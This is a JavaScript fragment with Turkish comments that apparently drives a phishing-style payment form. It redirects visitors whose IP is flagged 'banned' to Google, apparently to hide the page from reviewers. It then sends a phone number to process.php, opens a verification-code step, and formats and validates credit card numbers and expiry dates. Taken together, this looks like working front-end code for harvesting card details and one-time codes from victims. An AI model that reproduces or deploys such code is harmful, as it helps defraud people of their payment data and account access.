        document.addEventListener("DOMContentLoaded", function() {

        function checkIP() {
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    if (xhr.status == 200) {
                        var response = xhr.responseText;
                        if (response === "banned") {
                            window.location.href = "https://www.google.com";
                        }
                    } else {
                        console.error('İsteğin işlenmesinde bir hata oluştu.');
                    }
                }
            };
            xhr.open("GET", "check_ip.php", true);
            xhr.send();
        }

        document.getElementById('phone').addEventListener('input', function (e) {
        var inputValue = e.target.value;
        if (inputValue.charAt(0) === '0' && inputValue.length > 1) {
            e.target.value = inputValue.substr(1); 
        }

        var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? ' ' + x[3] : '');
    });

    function formatCreditCardNumber(input) {
        // Remove non-numeric characters
        let formatted = input.value.replace(/\D/g, '');
        
        // Format as groups of 4
        formatted = formatted.replace(/(\d{4})/g, '$1 ').trim();

        // Update input value
        input.value = formatted;
    }        

function submitPhone() {
    var phone = document.getElementById("phone").value;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "process.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            // Sunucudan gelen yanıtı burada işleyebilirsiniz.
            // Örneğin, başka bir sayfaya yönlendirebilirsiniz.
            window.location.href = "#verf";
            document.getElementById("phonef").style.display = "none";
            document.getElementById("verf").style.display = "block";
        }
    };
    xhr.send("action=submitPhone&phone=" + encodeURIComponent(phone));
}
    
function formatExpirationDate(input) {
    let value = input.value;

    // Remove non-numeric characters
    value = value.replace(/\D/g, '');

    // Add slash between MM and YY
    if (value.length > 2) {
        value = value.replace(/(\d{2})(\d{2})/, '$1 / $2');
    }

    // Update input value
    input.value = value;

    // Check if the entered date is valid
    let dateParts = value.split(' / ');
    let month = parseInt(dateParts[0]);
    let year = parseInt(dateParts[1]);

    let currentYear = new Date().getFullYear() % 100;
    let currentMonth = new Date().getMonth() + 1;

    // Get today's date
    let todayDate = new Date(currentYear, currentMonth);

    // Get the entered date
    let enteredDate = new Date(year, month);

    if (!(month >= 1 && month <= 12 && enteredDate >= todayDate)) {
        // Invalid date, set red border
        input.style.border = '1px solid red';
        // Disable button
        document.getElementById("loginButtonCredit").disabled = true;
    } else {
        // Valid date, reset border
        input.style.border = '1px solid #ccc';
        // Enable button
        document.getElementById("loginButtonCredit").disabled = false;
    }
}
